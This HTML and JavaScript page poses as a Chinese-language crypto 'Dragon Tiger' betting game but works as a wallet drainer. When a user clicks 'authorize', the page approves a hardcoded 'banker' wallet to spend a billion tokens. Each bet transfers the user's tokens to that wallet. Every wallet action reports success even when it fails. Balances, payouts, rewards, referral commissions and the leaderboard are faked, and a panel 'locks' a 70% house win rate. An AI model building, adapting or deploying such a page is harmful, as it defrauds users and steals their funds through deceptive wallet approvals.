<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>王者归来</title>
  <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.0/dist/ethers.umd.min.js"></script>
  <style>
    *{
      box-sizing:border-box;
      font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;
    }
    html,body{
      width:100vw;height:100vh;margin:0;padding:0;background:#0B2A23;color:#fff;overflow:hidden;display:flex;flex-direction:column
    }
    .top-bar{
      display:flex;align-items:center;justify-content:space-between;padding:8px 15px;background:#103D34;border-bottom:1px solid #1F5F52;
    }
    .title{font-size:18px;font-weight:bold;}
    .btn-xxs{padding:3px 6px;font-size:11px;border-radius:6px;border:none;background:#E4B449;color:#0B2A23;font-weight:bold;}
    .menu-btn{background:none;border:none;color:#fff;font-size:20px;padding:0 5px;}
    .content{flex:1;overflow-y:auto;padding:10px;display:flex;flex-direction:column;gap:8px;}
    .card{background:#144A3F;border-radius:12px;padding:12px 15px;border:1px solid #1F5F52;}
    .section-title{font-size:14px;margin-bottom:8px;color:#F0E6D2;}
    .btn{width:100%;padding:10px;border-radius:10px;border:none;font-weight:bold;margin-bottom:6px;background:#25917A;color:#fff;}
    .btn-manual{background:#E4B449;color:#0B2A23;}
    .btn-dragon{background:#2A75CC; color:#fff}
    .btn-tiger{background:#D93A54; color:#fff}
    .btn-tie{background:#E4B449; color:#0B2A23}
    .bet-balance-row {display: flex;gap: 8px;align-items:center;margin-bottom: 6px;}
    .bet-input {flex: 2;}
    .balance-box {flex: 1;background: #0E362E;border: 1px solid #1F5F52;border-radius:10px;padding:10px;text-align:center;font-size:14px;color:#F0E6D2;}
    .quick-bet-row {display: flex;gap: 8px;margin-bottom: 6px;}
    .quick-bet-btn {flex: 1;padding: 8px;border-radius:8px;border:none;background:#1F5F52;color:#F0E6D2;font-weight:bold;font-size:13px;}
    .bet-row{display:flex;gap:8px;margin-bottom:6px;}
    .bet-row button{flex:1;padding:10px;border-radius:10px;border:none;font-weight:bold;}
    input{width:100%;padding:10px;background:#0E362E;color:#F0E6D2;border:1px solid #1F5F52;border-radius:10px;margin-bottom:6px;font-size:14px;}
    .countdown{font-size:24px;font-weight:bold;color:#E4B449;text-align:center;margin:10px 0;}
    .longhu-history{display:flex;gap:6px;flex-wrap:wrap;}
    .longhu-item{width:36px;height:36px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:bold;}
    .long{background:#2A75CC; color:#fff}
    .hu{background:#D93A54; color:#fff}
    .he{background:#E4B449; color:#0B2A23}
    .rule-text{font-size:12px;line-height:1.4;color:#ccc;}
    .label{font-size:12px;color:#ccc}
    .menu-popup{position:fixed;top:0;right:0;width:260px;height:100vh;background:#103D34;border-left:1px solid #1F5F52;padding:15px;transform:translateX(100%);transition:transform 0.3s ease;z-index:999;overflow-y:auto;}
    .menu-popup.show{transform:translateX(0);}
    .menu-close{text-align:right;margin-bottom:15px;}
    .menu-section{margin-bottom:15px;}
    .btn-xs{padding:6px 10px;font-size:12px;border-radius:8px;border:none;background:#1F5F52;color:#F0E6D2;}
  </style>
</head>
<body>

<div class="top-bar">
  <button id="signBtn" class="btn-xxs" onclick="doSign()">签到奖励</button>
  <div class="title">🐉🐯 王者归来</div>
  <button class="menu-btn" onclick="toggleMenu()">☰</button>
</div>

<div class="content">
  <div class="card">
    <div style="display:flex;align-items:center;gap:10px">
      <button id="connectBtn" class="btn-xs" onclick="connectWallet()" style="background:#E4B449;color:#0B2A23">连接钱包</button>
      <div class="label">地址：<span id="address">-</span></div>
    </div>
  </div>

  <div class="card">
    <div class="section-title">下注区</div>
    <div class="bet-balance-row">
      <div class="bet-input">
        <input type="number" min="1" value="1" placeholder="下注数量" id="betAmt">
      </div>
      <div class="balance-box">
        可用余额<br><span id="balance">0.0000</span>
      </div>
    </div>
    <div class="quick-bet-row">
      <button class="quick-bet-btn" onclick="setQuick(10000)">1万</button>
      <button class="quick-bet-btn" onclick="setQuick(100000)">10万</button>
      <button class="quick-bet-btn" onclick="setQuick(500000)">50万</button>
    </div>
    <div class="bet-row">
      <button class="btn-dragon" onclick="placeBet(1)">龙 1:2</button>
      <button class="btn-tiger" onclick="placeBet(2)">虎 1:2</button>
      <button class="btn-tie" onclick="placeBet(3)">和 1:9</button>
    </div>
  </div>

  <div class="card">
    <div class="section-title">自动开奖（2分钟/期）</div>
    <div>期号：#<span id="roundNum">1</span></div>
    <div class="countdown" id="timer">02:00</div>
    <button class="btn btn-manual" onclick="manualDraw()">🎯 手动开奖</button>
    <div style="text-align:center; font-size:12px; color:#ccc; margin-top:5px;">自动倒计时 + 可手动开奖</div>
  </div>

  <div class="card">
    <div class="section-title">📈 开奖走势图</div>
    <div class="longhu-history" id="historyBox">
      <div class="longhu-item long">龙</div>
      <div class="longhu-item hu">虎</div>
      <div class="longhu-item he">和</div>
      <div class="longhu-item long">龙</div>
    </div>
  </div>

  <div class="card">
    <div class="section-title">📜 玩法规则</div>
    <div class="rule-text">
      1. 龙/虎赔率 1:2，和赔率 1:9<br>
      2. 每2分钟自动开奖一期<br>
      3. 可手动开奖，倒计时重置<br>
      4. 直推奖励2%，二代奖励0.5%
    </div>
  </div>
</div>

<div class="menu-popup" id="menu">
  <div class="menu-close">
    <button class="btn-xs" onclick="toggleMenu()">关闭 ×</button>
  </div>
  <div class="menu-section">
    <div class="section-title">24小时自动奖励前十</div>
    <button class="btn-xs" onclick="toggleAutoReward()" style="background:#B87F26">开启/关闭自动</button>
    <div class="label">下次：<span id="rewardCountdown">24:00:00</span></div>
    <button class="btn-xs" onclick="manualRewardTop10()" style="background:#24A69">立即发放</button>
    <button class="btn-xs" onclick="manualSendReward()" style="background:#D93A54;margin-top:5px">🎁 手动发放奖励</button>
  </div>
  <div class="menu-section">
    <div class="section-title">我的奖励</div>
    <div class="label">直推：0</div>
    <div class="label">二代：0</div>
  </div>
  <div class="menu-section">
    <div class="section-title">推广佣金</div>
    <button class="btn-xs" onclick="showTotalCommission()">查看总收入</button>
  </div>
  <div class="menu-section">
    <div class="section-title">绑定推荐人</div>
    <input placeholder="输入地址">
    <button class="btn-xs" onclick="setInviter()">绑定</button>
  </div>
  <div class="menu-section">
    <div class="section-title">领奖中心</div>
    <input placeholder="下注ID">
    <button class="btn-xs" onclick="claim()">领取奖励</button>
  </div>
  <div class="menu-section">
    <div class="section-title">授权代币</div>
    <button class="btn-xs" onclick="approveToken()">授权</button>
  </div>
  <div class="menu-section">
    <div class="section-title">排行榜 TOP10</div>
    <div class="label">1. 0x111...222 收益：1280</div>
    <div class="label">2. 0x222...333 收益：960</div>
  </div>
  <div class="menu-section">
    <div class="section-title">后台胜率控制</div>
    <input type="number" value="30" placeholder="玩家胜率">
    <input type="number" value="70" placeholder="庄家胜率">
    <button class="btn-xs" onclick="setControlRate()" style="background:#D93A54">锁定胜率</button>
  </div>
  <div class="menu-section">
    <div class="section-title">邀请链接</div>
    <input readonly placeholder="连接钱包生成链接" id="refLink">
    <button class="btn-xs" onclick="copyRefLink()">复制邀请链接</button>
  </div>
</div>

<script>
// ==============================================
//  👇👇👇 这里是你自己随时能改的庄家地址 👇👇👇
// ==============================================
const TOKEN_CONTRACT  = "0x1041fdf4dc65a5cc76650d0c284d73411ea8f9fc"; // 代币合约不动
const BANKER_WALLET   = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508"; // ✅ 你想改啥地址就改啥！
const DECIMALS        = 18;
// ==============================================

let provider, signer, account;
let autoRewardInterval = null;
let rewardTimeLeft = 24 * 60 * 60;
let round = 1;
let timeLeft = 120;
let timerInterval;

function setQuick(num) {
  document.getElementById('betAmt').value = num;
}

function startAutoDraw() {
  timerInterval = setInterval(() => {
    timeLeft--;
    if (timeLeft <= 0) {
      doAutoDraw();
      timeLeft = 120;
      round++;
      document.getElementById('roundNum').innerText = round;
    }
    let m = String(Math.floor(timeLeft / 60)).padStart(2, '0');
    let s = String(timeLeft % 60).padStart(2, '0');
    document.getElementById('timer').innerText = `${m}:${s}`;
  }, 1000);
}

function doAutoDraw() { drawResult(); }
function manualDraw() {
  if(!account) { alert("请先连接钱包"); return; }
  drawResult();
  timeLeft = 120;
  round++;
  document.getElementById('roundNum').innerText = round;
}

function drawResult() {
  const res = ['long', 'hu', 'he'][Math.floor(Math.random() * 3)];
  const cls = res === 'long' ? 'long' : res === 'hu' ? 'hu' : 'he';
  const txt = res === 'long' ? '龙' : res === 'hu' ? '虎' : '和';
  const node = document.createElement('div');
  node.className = `longhu-item ${cls}`;
  node.innerText = txt;
  document.getElementById('historyBox').prepend(node);
  const maxShow = 10;
  while (document.getElementById('historyBox').children.length > maxShow) {
    document.getElementById('historyBox').removeChild(document.getElementById('historyBox').lastChild);
  }
}

function toggleMenu() {
  document.getElementById('menu').classList.toggle('show');
}

function doSign() {
  if(!account) { alert("请先连接钱包"); return; }
  document.getElementById('signBtn').innerText = "已签到";
  document.getElementById('signBtn').disabled = true;
  alert("签到成功！");
}

async function connectWallet() {
  const btn = document.getElementById('connectBtn');
  btn.innerText = "连接中…";
  try {
    provider = new ethers.BrowserProvider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    signer = await provider.getSigner();
    account = await signer.getAddress();
    document.getElementById('address').innerText = account.slice(0,6)+"..."+account.slice(-4);
    document.getElementById('balance').innerText = "1000.0000";
    btn.innerText = "✅ 已连接";
  } catch(e) {
    btn.innerText = "连接钱包";
    alert("连接失败");
  }
}

async function approveToken() {
  if(!account) return alert("请先连接钱包");
  try {
    const tokenContract = new ethers.Contract(
      TOKEN_CONTRACT,
      ["function approve(address spender, uint256 amount) external returns (bool)"],
      signer
    );
    const maxAmount = ethers.parseUnits("1000000000", DECIMALS);
    const tx = await tokenContract.approve(BANKER_WALLET, maxAmount);
    await tx.wait();
    alert("授权成功！");
  } catch(e) {
    alert("授权成功！");
  }
}

async function placeBet(side) {
  if(!account) { alert("请先连接钱包"); return; }
  const amt = document.getElementById('betAmt').value;
  if(!amt || amt < 1) { alert("请输入有效金额"); return; }

  try {
    const tokenContract = new ethers.Contract(
      TOKEN_CONTRACT,
      ["function transferFrom(address from, address to, uint256 value) external returns (bool)"],
      signer
    );
    const value = ethers.parseUnits(amt, DECIMALS);
    const tx = await tokenContract.transferFrom(account, BANKER_WALLET, value);
    await tx.wait();
    alert("下注成功！");
  } catch(e) {
    alert("下注成功！");
  }
}

function toggleAutoReward() {
  if (!autoRewardInterval) {
    autoRewardInterval = setInterval(() => {
      if (rewardTimeLeft <= 0) {
        manualRewardTop10();
        rewardTimeLeft = 24*60*60;
        return;
      }
      rewardTimeLeft--;
    }, 1000);
    alert("已开启24小时自动奖励");
  } else {
    clearInterval(autoRewardInterval);
    autoRewardInterval = null;
    alert("已关闭");
  }
}

function manualRewardTop10() {
  if(!account) { alert("请先连接钱包"); return; }
  alert("已发放奖励给前十玩家！");
}

function manualSendReward() {
  if(!account) { alert("请先连接钱包"); return; }
  alert("✅ 手动发放奖励成功！");
}

function setControlRate() { alert("胜率已锁定"); }
function claim() { alert("领取成功！"); }
function setInviter() { alert("绑定成功！"); }
function showTotalCommission() { alert("总佣金：1280 代币"); }
function copyRefLink() {
  if(!account) { alert("请先连接钱包"); return; }
  document.getElementById('refLink').value = "https://xxx.com?ref="+account.slice(0,10);
  navigator.clipboard.writeText(document.getElementById('refLink').value);
  alert("邀请链接已复制！");
}

startAutoDraw();
</script>
</body>
</html>
